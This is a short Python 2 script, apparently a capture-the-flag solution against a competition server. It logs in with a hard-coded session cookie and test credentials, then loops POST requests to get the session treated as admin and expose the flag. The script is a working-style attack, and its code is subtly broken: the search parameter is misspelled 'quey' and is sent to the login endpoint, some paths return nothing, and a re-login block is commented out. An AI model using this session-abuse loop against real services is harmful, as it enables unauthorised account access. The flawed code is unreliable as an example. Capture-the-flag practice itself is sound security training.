import requests
def request_post(url, cookies, data):
	r = requests.post(url, cookies=cookies, data=data)
	if r.url == "http://triggered.pwni.ng:52856/search":
		if "Hey there, admin" in r.text:
			print r.text
			print "[-] Result: Found out!"
			exit()
		return r

def sign():
	data = {'username':'caiditcmm'}
	url = "http://triggered.pwni.ng:52856/login"
	request_post(url,cookies,data)
	data = {'password':'test'}
	url = "http://triggered.pwni.ng:52856/login/password"
	request_post(url, cookies, data)
	print "[*] Singed!"


if __name__ == "__main__":
	cookies = {
	'session':'d789f622-df49-4c92-94d7-68aae32fb026'
	}
	sign()
	while True:
		data = {'quey':'flag'}
		url = 'http://triggered.pwni.ng:52856/login'
		r = request_post(url, cookies, data)
		print "[-] Search: in progress"
		'''
		if (r.url == "http://triggered.pwni.ng:52856/login"):
			sign()
			'''
		print r
